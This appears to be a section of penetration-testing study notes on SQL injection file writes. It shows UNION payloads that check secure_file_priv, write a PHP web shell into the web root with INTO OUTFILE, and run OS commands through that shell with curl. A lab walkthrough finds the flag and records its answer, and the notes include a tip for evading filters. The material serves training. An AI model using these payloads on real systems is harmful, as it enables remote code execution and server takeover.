# Section 15 — Writing Files

---

## Prerequisites — Three Requirements

Three things must be true before you can write files through MySQL:

1. The database user must have the `FILE` privilege (confirmed in Section 14)
2. `secure_file_priv` must be empty or point to a writable path (not NULL)
3. The operating system account that MySQL runs as must have write permission on the target directory

---

## Check secure_file_priv

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4
FROM information_schema.global_variables
WHERE variable_name="secure_file_priv"-- -
```

| Value | Meaning |
|-------|---------|
| *(empty)* | Can read/write anywhere — **exploit works** |
| `/var/lib/mysql-files` | Restricted to that path — webshell not possible |
| `NULL` | File I/O disabled entirely — no read or write |

> MariaDB defaults to empty. MySQL defaults to `/var/lib/mysql-files`. Empty = jackpot.

---

## SELECT INTO OUTFILE — Write Arbitrary Files

```sql
-- Write table data to a file
SELECT * FROM users INTO OUTFILE '/tmp/credentials';

-- Write a literal string to a file
SELECT 'test content' INTO OUTFILE '/tmp/test.txt';

-- Write via UNION injection (use "" for clean output — no junk numbers)
cn' UNION SELECT "", "content here", "", "" INTO OUTFILE '/var/www/html/output.txt'-- -
```

> No output on success — a blank result table means the write worked. An error means it failed.

---

## Writing a PHP Web Shell

```sql
cn' union select "","<?php system($_REQUEST[0]); ?>","","" into outfile '/var/www/html/shell.php'-- -
```

- `$_REQUEST[0]` — accepts OS commands via the GET or POST parameter `?0=COMMAND`
- Empty strings for the other columns — keeps the file clean so no junk numbers get written to it

**Verify and use:**
```bash
# Check shell exists
curl http://TARGET_IP:PORT/shell.php?0=id

# Find flags
curl "http://TARGET_IP:PORT/shell.php?0=find+/+-name+'flag*'+-o+-name+'*.flag'+2>/dev/null"

# Read flag
curl "http://TARGET_IP:PORT/shell.php?0=cat+/var/www/flag.txt"
```
> Three commands to verify the shell, find flag files, and read them. The `?0=` parameter passes OS commands to the PHP `system()` call. URL-encode spaces as `+`. Replace `TARGET_IP`, `PORT`, and file paths with your target's values.

---

## Finding the Web Root

If the webroot is unknown:
- Read Apache config: `LOAD_FILE("/etc/apache2/apache2.conf")` or `/etc/apache2/sites-enabled/000-default.conf`
- Read Nginx config: `LOAD_FILE("/etc/nginx/nginx.conf")`
- Try common paths: `/var/www/html/`, `/srv/http/`, `/usr/share/nginx/html/`

---

## Lab — Write a Web Shell and Find the Flag

**Target:** `http://TARGET_IP:TARGET_PORT/search.php?port_code=`  
**Objective:** Write a PHP web shell, then use it to read the flag.

**Step 1 — Confirm secure_file_priv is empty:**

```bash
curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+UNION+SELECT+1,variable_name,variable_value,4+FROM+information_schema.global_variables+where+variable_name=%22secure_file_priv%22--+-"
# Returns: SECURE_FILE_PRIV | (empty) | 4  → write anywhere
```
> Checks the `secure_file_priv` setting via UNION injection. An empty value in the response means the MySQL user can write to any directory. Replace `TARGET_IP` and `TARGET_PORT` with your target's values.

**Step 2 — Write shell.php:**

```bash
curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+union+select+%22%22,%22%3C%3Fphp+system(%24_REQUEST%5B0%5D)%3B+%3F%3E%22,%22%22,%22%22+into+outfile+%27/var/www/html/shell.php%27--+-"
# No error in response = success
```
> Writes a PHP web shell to `/var/www/html/shell.php` via URL-encoded UNION injection. The payload decodes to `<?php system($_REQUEST[0]); ?>`. No response content means success; an error means the write failed.

**Step 3 — Find and read the flag:**

```bash
curl "http://TARGET_IP:TARGET_PORT/shell.php?0=find+/+-name+'flag*'+-o+-name+'*.flag'+2>/dev/null"
# Found: /var/www/flag.txt

curl "http://TARGET_IP:TARGET_PORT/shell.php?0=cat+/var/www/flag.txt"
```
> Uses the uploaded shell to search for flag files, then reads the result. Replace `TARGET_IP`, `TARGET_PORT`, and the flag path with your target's values.

**Result:**
```
d2b5b27ae688b6a0f1d21b7d3a0798cd
```

**Q1 Answer:** `d2b5b27ae688b6a0f1d21b7d3a0798cd`

---

## Exam Notes

- `INTO OUTFILE` writes the **entire SELECT result** — use `""` as padding columns to avoid junk data in the shell file
- A blank result table (no error) = successful write; SQL errors = failed write (check privileges or path)
- `$_REQUEST[0]` accepts both GET and POST, and the parameter name `0` is less likely to be filtered than `cmd`
- Web shell → RCE → full server access if the MySQL user has FILE and the webroot is writable
- For binary files or long payloads, use `FROM_BASE64("base64_data")` inside the SELECT
